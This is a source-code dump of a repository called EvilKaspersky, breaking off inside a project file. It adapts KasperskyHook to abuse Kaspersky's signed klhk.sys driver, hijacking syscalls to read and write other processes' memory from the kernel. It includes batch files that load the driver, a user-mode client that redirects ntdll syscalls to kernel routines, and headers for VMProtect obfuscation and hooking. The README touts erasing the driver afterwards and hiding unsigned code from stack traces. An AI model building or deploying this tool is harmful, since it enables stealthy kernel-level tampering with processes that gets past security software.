Project Path: arc_gmh5225_EvilKaspersky_rwfod0pj

Source Tree:

```txt
arc_gmh5225_EvilKaspersky_rwfod0pj
├── README.txt
├── drv
│   ├── create_service.bat
│   ├── klhk.sys
│   └── remove_service.bat
├── ec
│   └── ec
│       ├── ec
│       │   ├── driver.h
│       │   ├── ec.vcxproj
│       │   ├── ec.vcxproj.filters
│       │   └── main.cpp
│       └── ec.sln
└── ek
    ├── ek
    │   ├── VMProtectDDK64.lib
    │   ├── defines.h
    │   ├── ek.vcxproj
    │   ├── ek.vcxproj.filters
    │   ├── general.h
    │   ├── main.cpp
    │   ├── utils.cpp
    │   ├── utils.h
    │   ├── vmp.h
    │   └── xor.h
    └── ek.sln

```

`README.txt`:

```txt
This is an old experiment I did year ago and now just saw the repo and decided
to make it public. It is KasperkyHook, but the syscalls directly point onto
functions useful for interprocess memory copying. You can fully unload the control
driver afterwards and erase its memory. Another advantage is that you won't have any
unsigned code at the stack trace of the thread.

KasperskyHook: https://github.com/iPower/KasperskyHook

```

`drv/create_service.bat`:

```bat
sc create kaspersky binPath= "%~dp0\klhk.sys" type= kernel
sc start kaspersky
pause
```

`drv/remove_service.bat`:

```bat
sc stop kaspersky
sc delete kaspersky
pause
```

`ec/ec/ec.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.2.32602.215
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "ec", "ec\ec.vcxproj", "{656748F0-70DC-43FF-8AF8-FE5FAC151F63}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Release|x64 = Release|x64
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{656748F0-70DC-43FF-8AF8-FE5FAC151F63}.Release|x64.ActiveCfg = Release|x64
		{656748F0-70DC-43FF-8AF8-FE5FAC151F63}.Release|x64.Build.0 = Release|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {DF74A549-79CC-4B02-A9F8-9E25425BF512}
	EndGlobalSection
EndGlobal

```

`ec/ec/ec/driver.h`:

```h
#ifndef DRIVER_CONTROL_H
#define DRIVER_CONTROL_H

#include <Windows.h>
#include <winternl.h>
#include <thread>

typedef enum _MEMORY_INFORMATION_CLASS
{
	MemoryBasicInformation, // MEMORY_BASIC_INFORMATION
	MemoryWorkingSetInformation, // MEMORY_WORKING_SET_INFORMATION
	MemoryMappedFilenameInformation, // UNICODE_STRING
	MemoryRegionInformation, // MEMORY_REGION_INFORMATION
	MemoryWorkingSetExInformation, // MEMORY_WORKING_SET_EX_INFORMATION
	MemorySharedCommitInformation, // MEMORY_SHARED_COMMIT_INFORMATION
	MemoryImageInformation,
	MemoryRegionInformationEx,
	MemoryPrivilegedBasicInformation,
	MemoryEnclaveImageInformation,
	MemoryBasicInformationCapped
} MEMORY_INFORMATION_CLASS;

extern "C" NTSTATUS NTAPI NtQueryVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength);

#define MAX_VIRTUAL_USERMODE 0x7FFFFFFFFFFF
#define MIN_VIRTUAL_USERMODE 0x10000

class DriverControl
{
private:
	HANDLE targetProcessPid;
	PVOID currentProcess;
	PVOID targetProcess;
	PVOID kernelMemory;

	typedef PVOID(__stdcall* ExAllocatePool_t)(DWORD64 PoolType, SIZE_T NumberOfBytes);
	volatile ExAllocatePool_t ExAllocatePool = nullptr;
	typedef DWORD64(__stdcall* PsLookupProcessByProcessId_t)(HANDLE processId, void** process);
	volatile PsLookupProcessByProcessId_t PsLookupProcessByProcessId = nullptr;
	typedef DWORD64(__stdcall* MmCopyVirtualMemory_t)(PVOID sourceProcess, PVOID sourceAddress, PVOID targetProcess, PVOID targetAddress, SIZE_T bufferSize, CCHAR previousMode, PVOID returnSize);
	volatile MmCopyVirtualMemory_t MmCopyVirtualMemory = nullptr;

	bool CheckAddress(PVOID address)
	{
		if (reinterpret_cast<DWORD64>(address) > MAX_VIRTUAL_USERMODE)
			return false;

		if (reinterpret_cast<DWORD64>(address) < MIN_VIRTUAL_USERMODE)
			return false;

		return true;
	}
public:
	void Init()
	{
		// has to be loaded so that it sets up some things
		HMODULE userModule = LoadLibraryA("user32.dll");
		if (!userModule)
			return;
		printf("user32.dll: 0x%p\n", userModule);

		HMODULE targetModule = LoadLibraryA("ntdll.dll");
		if (!targetModule)
			return;
		printf("ntdll.dll: 0x%p\n", targetModule);

		PsLookupProcessByProcessId = reinterpret_cast<PsLookupProcessByProcessId_t>(GetProcAddress(targetModule, "NtSetBootEntryOrder"));
		ExAllocatePool = reinterpret_cast<ExAllocatePool_t>(GetProcAddress(targetModule, "NtSetBootOptions"));
		MmCopyVirtualMemory = reinterpret_cast<MmCopyVirtualMemory_t>(GetProcAddress(targetModule, "NtCreateProfileEx"));

		if (!PsLookupProcessByProcessId
			|| !MmCopyVirtualMemory
			|| !ExAllocatePool)
		{
			printf("Failed to resolve functions!\n");
			getchar();
			return;
		}

		printf("NtSetBootEntryOrder: 0x%p\n", PsLookupProcessByProcessId);
		printf("NtSetBootOptions: 0x%p\n", ExAllocatePool);
		printf("NtCreateProfile: 0x%p\n", MmCopyVirtualMemory);

		DWORD64 status = PsLookupProcessByProcessId(reinterpret_cast<HANDLE>(GetCurrentProcessId()), &currentProcess);
		if (status != 0)
		{
			printf("Failed to get current process EPROCESS (0x%p)!\n", reinterpret_cast<PVOID>(status));
			getchar();
			return;
		}

		printf("Client EPROCESS: 0x%p\n", currentProcess);

		kernelMemory = ExAllocatePool(0, 128);
		if (!kernelMemory)
		{
			printf("Failed to allocate non paged memory!\n");
			getchar();
			return;
		}

		printf("Non paged memory: 0x%p\n", kernelMemory);
	}

	void SetTarget(HANDLE pid)
	{
		targetProcessPid = pid;

		DWORD64 status = PsLookupProcessByProcessId(targetProcessPid, &targetProcess);
		if (status != 0)
		{
			printf("Failed to get target process EPROCESS (0x%p)!\n", reinterpret_cast<PVOID>(status));
			getchar();
			return;
		}

		printf("Target EPROCESS: 0x%p\n", targetProcess);
	}

	bool Check()
	{
		return reinterpret_cast<DWORD64>(currentProcess) > 0x7FFFFFFFFFFF;
	}

	bool ReadMemory(PVOID source, PVOID destination, SIZE_T size)
	{
		if (!CheckAddress(source))
			return false;

		if (!CheckAddress(destination))
			return false;

		DWORD64 status = MmCopyVirtualMemory(targetProcess, source, currentProcess, destination, size, 0 /* KernelMode */, kernelMemory);
		return status == 0;
	}

	bool WriteMemory(PVOID source, PVOID destination, SIZE_T size)
	{
		if (!CheckAddress(source))
			return false;

		if (!CheckAddress(destination))
			return false;

		DWORD64 status = MmCopyVirtualMemory(currentProcess, source, targetProcess, destination, size, 0, kernelMemory);
		return status == 0;
	}

	PVOID GetModule(const wchar_t* moduleName)
	{
		HANDLE targetProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION, 0, *reinterpret_cast<DWORD*>(&targetProcessPid));
		if (!targetProcessHandle || targetProcessHandle == INVALID_HANDLE_VALUE)
			return nullptr;

		DWORD64 currentAddress = 0;
		MEMORY_BASIC_INFORMATION memoryInformation;
		while (VirtualQueryEx(targetProcessHandle, reinterpret_cast<PVOID>(currentAddress), &memoryInformation, sizeof(MEMORY_BASIC_INFORMATION64)))
		{
			if (memoryInformation.Type == MEM_MAPPED || memoryInformation.Type == MEM_IMAGE)
			{
				constexpr SIZE_T bufferSize = 1024;
				PVOID buffer = malloc(bufferSize);

				SIZE_T bytesOut;
				NTSTATUS status = NtQueryVirtualMemory(targetProcessHandle, memoryInformation.BaseAddress, MemoryMappedFilenameInformation, buffer, bufferSize, &bytesOut);
				if (status == 0)
				{
					UNICODE_STRING* stringBuffer = static_cast<UNICODE_STRING*>(buffer);
					if (wcsstr(stringBuffer->Buffer, moduleName) && !wcsstr(stringBuffer->Buffer, L".mui"))
					{
						free(buffer);
						CloseHandle(targetProcessHandle);
						return memoryInformation.BaseAddress;
					}
				}

				free(buffer);
			}

			currentAddress = reinterpret_cast<DWORD64>(memoryInformation.BaseAddress) + memoryInformation.RegionSize;
		}

		CloseHandle(targetProcessHandle);
		return nullptr;
	}

	template<typename T>
	T Read(DWORD64 address)
	{
		T val = T();
		ReadMemory((PVOID)address, &val, sizeof(T));
		return val;
	}

	template<typename T>
	void Write(DWORD64 address, T value)
	{
		WriteMemory(&value, (PVOID)address, sizeof(T));
	}
};

extern DriverControl* g_Drv;

#endif
```

`ec/ec/ec/ec.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{656748f0-70dc-43ff-8af8-fe5fac151f63}</ProjectGuid>
    <RootNamespace>ec</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
    <UseOfMfc>Static</UseOfMfc>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalDependencies>ntdll.lib;%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="driver.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`ec/ec/ec/ec.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp">
      <Filter>Source</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="driver.h">
      <Filter>Source</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`ec/ec/ec/main.cpp`:

```cpp
#include <Windows.h>
#include <iostream>
#include <tlhelp32.h>
#include "driver.h"

DriverControl driver;

typedef struct _LargeBuffer
{
	unsigned char Buffer[56000];
} LargeBuffer;

void PrintHex(const unsigned char* buf, size_t buf_len)
{
	size_t i = 0;
	for (i = 0; i < buf_len; ++i)
		printf("%02X%s", buf[i],
			(i + 1) % 16 == 0 ? "\r\n" : " ");

	printf("\n");
}

int GetProcessID(const wchar_t* processName)
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot)
	{
		PROCESSENTRY32 entry = { 0 };
		entry.dwSize = sizeof(entry);
		if (Process32First(snapshot, &entry))
		{
			do
			{
				if (0 == _wcsicmp(entry.szExeFile, processName))
				{
					CloseHandle(snapshot);
					return entry.th32ProcessID;
				}
			} while (Process32Next(snapshot, &entry));
		}

		CloseHandle(snapshot);
	}

	return 0;
}

static DWORD64 moduleBase = 0;
void ThreadBench(int id)
{
	while (true)
	{
		DWORD64 totalOk = 0;
		DWORD64 totalFail = 0;

		auto t1 = std::chrono::high_resolution_clock::now();
		for (int i = 0; i < 100000; i++)
		{
			int offset = rand() % 20 + 1; // this is slow btw
			offset += 0x48;
			volatile int readValue = driver.Read<int>(moduleBase + offset);
			volatile int readConfirm = driver.Read<int>(moduleBase + offset);
			if (readValue == readConfirm && readValue != 0)
				totalOk++;
			else
			{
				totalFail++;
				printf("Invalid read: %x %x\n", readValue, readConfirm);
			}
		}
		auto t2 = std::chrono::high_resolution_clock::now();
		auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(t2 - t1).count();
		printf("Ok: %llu Fail: %llu In: %llu\n", totalOk, totalFail, duration);
	}
}

int main()
{
	printf("Waiting on ProcessHacker.exe...\n");
	int targetProcessId = 0;
	while (targetProcessId == 0)
	{
		targetProcessId = GetProcessID(L"ProcessHacker.exe");
		Sleep(10);
	}

	printf("Init...\n");
	driver.Init();

	printf("Check...\n");
	bool status = driver.Check();
	if (!status)
	{
		printf("Failed check!\n");
		getchar();
		return -1;
	}
	printf("Communication check done\n");

	printf("Set target...\n");
	driver.SetTarget(reinterpret_cast<HANDLE>(targetProcessId));

	printf("Get modules...\n");
	PVOID module1 = driver.GetModule(L"kernel32.dll");
	PVOID module2 = driver.GetModule(L"user32.dll");
	moduleBase = (DWORD64)module1;
	printf("kernel32.dll: 0x%p\n", module1);
	printf("user32.dll: 0x%p\n", module2);

	printf("Waiting...\n");
	Sleep(100);

	printf("Press key\n");
	getchar();

	LargeBuffer* largeBuffer = static_cast<LargeBuffer*>(malloc(sizeof(LargeBuffer)));
	printf("Short read test...\n");
	memset(largeBuffer, 0, sizeof(LargeBuffer));
	driver.ReadMemory(module1, largeBuffer, 20);
	PrintHex(largeBuffer->Buffer, 20);

	printf("Multi-thread test...\n");
	for (int i = 0; i < 5; i++)
	{
		printf("Starting ID %i...\n", i);
		std::thread thread(ThreadBench, i);
		thread.detach();
	}

	while (true)
		Sleep(10000);
}
```

`ek/ek.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.2.32602.215
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "ek", "ek\ek.vcxproj", "{21027971-610C-4959-B997-CE4CF5C2BB83}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Release|x64 = Release|x64
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{21027971-610C-4959-B997-CE4CF5C2BB83}.Release|x64.ActiveCfg = Release|x64
		{21027971-610C-4959-B997-CE4CF5C2BB83}.Release|x64.Build.0 = Release|x64
		{21027971-610C-4959-B997-CE4CF5C2BB83}.Release|x64.Deploy.0 = Release|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {BC9C947A-D4D8-443A-AADB-D201D8DE98E6}
	EndGlobalSection
EndGlobal

```

`ek/ek/defines.h`:

```h
#pragma once

#define MAX_VIRTUAL_USERMODE 0x7FFFFFFFFFFF
#define MIN_VIRTUAL_USERMODE 0x10000

namespace enums
{
	enum SystemInformationClass
	{
		SystemProcessInformation = 5,
		SystemModuleInformationClass = 11
	};
}

namespace structs
{
	typedef struct _RTL_PROCESS_MODULE_INFORMATION
	{
		HANDLE Section;
		PVOID MappedBase;
		PVOID ImageBase;
		ULONG ImageSize;
		ULONG Flags;
		USHORT LoadOrderIndex;
		USHORT InitOrderIndex;
		USHORT LoadCount;
		USHORT OffsetToFileName;
		UCHAR FullPathName[256];
	} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

	typedef struct _RTL_PROCESS_MODULES
	{
		ULONG NumberOfModules;
		RTL_PROCESS_MODULE_INFORMATION Modules[1];
	} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;

	typedef struct _POOL_TRACKER_BIG_PAGES
	{
		volatile ULONGLONG Va;
		ULONG Key;
		ULONG Pattern : 8;
		ULONG PoolType : 12;
		ULONG SlushSize : 12;
		ULONGLONG NumberOfBytes;
	} POOL_TRACKER_BIG_PAGES, * PPOOL_TRACKER_BIG_PAGES;

	typedef struct _LDR_DATA_TABLE_ENTRY
	{
		LIST_ENTRY InLoadOrderLinks;
		LIST_ENTRY InMemoryOrderLinks;
		LIST_ENTRY InInitializationOrderLinks;
		PVOID DllBase;
		PVOID EntryPoint;
		ULONG SizeOfImage;
		UNICODE_STRING FullDllName;
		UNICODE_STRING BaseDllName;
		ULONG Flags;
		USHORT LoadCount;
		USHORT TlsIndex;
		LIST_ENTRY HashLinks;
		ULONG TimeDateStamp;
	} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

	typedef struct _PEB_LDR_DATA
	{
		ULONG Length;
		UCHAR Initialized;
		PVOID SsHandle;
		LIST_ENTRY InLoadOrderModuleList;
		LIST_ENTRY InMemoryOrderModuleList;
		LIST_ENTRY InInitializationOrderModuleList;
	} PEB_LDR_DATA, * PPEB_LDR_DATA;

	typedef struct _PEB
	{
		UCHAR InheritedAddressSpace;
		UCHAR ReadImageFileExecOptions;
		UCHAR BeingDebugged;
		UCHAR BitField;
		PVOID Mutant;
		PVOID ImageBaseAddress;
		PPEB_LDR_DATA Ldr;
		PVOID ProcessParameters;
		PVOID SubSystemData;
		PVOID ProcessHeap;
		PVOID FastPebLock;
		PVOID AtlThunkSListPtr;
		PVOID IFEOKey;
		PVOID CrossProcessFlags;
		PVOID KernelCallbackTable;
		ULONG SystemReserved;
		ULONG AtlThunkSListPtr32;
		PVOID ApiSetMap;
	} PEB, * PPEB;

	typedef struct _SYSTEM_PROCESS_INFORMATION
	{
		ULONG NextEntryOffset;
		ULONG NumberOfThreads;
		BYTE Reserved1[48];
		UNICODE_STRING ImageName;
		KPRIORITY BasePriority;
		HANDLE UniqueProcessId;
		PVOID Reserved2;
		ULONG HandleCount;
		ULONG SessionId;
		PVOID Reserved3;
		SIZE_T PeakVirtualSize;
		SIZE_T VirtualSize;
		ULONG Reserved4;
		SIZE_T PeakWorkingSetSize;
		SIZE_T WorkingSetSize;
		PVOID Reserved5;
		SIZE_T QuotaPagedPoolUsage;
		PVOID Reserved6;
		SIZE_T QuotaNonPagedPoolUsage;
		SIZE_T PagefileUsage;
		SIZE_T PeakPagefileUsage;
		SIZE_T PrivatePageCount;
		LARGE_INTEGER Reserved7[6];
	} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

	typedef struct _KPROCESS
	{
		struct _DISPATCHER_HEADER Header;                                       //0x0
		struct _LIST_ENTRY ProfileListHead;                                     //0x18
		ULONGLONG DirectoryTableBase;                                           //0x28
		struct _LIST_ENTRY ThreadListHead;                                      //0x30
		ULONG ProcessLock;                                                      //0x40
		ULONG ProcessTimerDelay;                                                //0x44
		ULONGLONG DeepFreezeStartTime;                                          //0x48
	} KPROCESS, * PKPROCESS;
}

namespace imports
{
	extern "C" NTSTATUS ZwQuerySystemInformation(INT systemInformationClass, PVOID systemInformation, ULONG systemInformationLength, PULONG returnLength);
	//extern "C" NTSTATUS MmCopyVirtualMemory(PEPROCESS sourceProcess, PVOID sourceAddress, PEPROCESS targetProcess, PVOID targetAddress, SIZE_T bufferSize, KPROCESSOR_MODE previousMode, PSIZE_T returnSize);
	extern "C" PPEB PsGetProcessPeb(PEPROCESS process);
	extern "C" PVOID PsGetProcessSectionBaseAddress(PEPROCESS process);
	extern "C" NTKERNELAPI NTSTATUS KeFlushCurrentTbImmediately();
	extern "C" NTKERNELAPI NTSTATUS NtQueryInformationAtom();
}

#define RELATIVE_ADDRESS(address, size) ((PVOID)((PBYTE)(address) + *(PINT)((PBYTE)(address) + ((size) - (INT)sizeof(INT))) + (size)))

#define STATUS_KASPERSKY_BASE_NOT_FOUND 0xCCCCCC0
#define STATUS_SCAN_0_NOT_FOUND 0xCCCCCC1
#define STATUS_SCAN_1_NOT_FOUND 0xCCCCCC2
#define STATUS_SCAN_2_NOT_FOUND 0xCCCCCC3
#define STATUS_SCAN_3_NOT_FOUND 0xCCCCCC4
#define STATUS_SCAN_4_NOT_FOUND 0xCCCCCC5
#define STATUS_HVM_START_FAILED 0xCCCCCC6
#define STATUS_HOOK_0_FAILED 0xCCCCCC7
#define STATUS_HOOK_1_FAILED 0xCCCCCC8
#define STATUS_HOOK_2_FAILED 0xCCCCCC9
#define STATUS_HOOK_3_FAILED 0xCCCCCF0
#define STATUS_SHELLCODE_FAILED 0xCCCCCF1
#define STATUS_IMPORT_NOT_FOUND 0xCCCCCF2
#define STATUS_UNSUPPORTED_VERSION 0xDEADFEED
#define STATUS_VERSION_QUERY_FAIL 0xCCCCCF3

namespace indexes
{
	// can be read using SSDTView or Windows Kernel Explorer
	// should correspond with syscall numbers
	static USHORT NtCreateProfileExIndex = 187;
	//static USHORT NtSetCachedSigningLevelIndex = 393;
	static USHORT NtSetBootEntryOrderIndex = 391;
	static USHORT NtSetBootOptionsIndex = 392;
}
```

`ek/ek/ek.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|ARM64">
      <Configuration>Debug</Configuration>
      <Platform>ARM64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|ARM64">
      <Configuration>Release</Configuration>
      <Platform>ARM64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{21027971-610C-4959-B997-CE4CF5C2BB83}</ProjectGuid>
    <TemplateGuid>{1bc93793-694f-48fe-9372-81e2b05556fd}</TemplateGuid>
    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
    <MinimumVisualStudioVersion>12.0</MinimumVisualStudioVersion>
    <Configuration>Debug</Configuration>
    <Platform Condition="'$(Platform)' == ''">x64</Platform>
    <RootNamespace>ek</RootNamespace>
    <WindowsTargetPlatformVersion>$(LatestTargetPlatformVersion)</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Desktop</DriverTargetPlatform>
    <Driver_SpectreMitigation>false</Driver_SpectreMitigation>
    <ALLOW_DATE_TIME>1</ALLOW_DATE_TIME>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
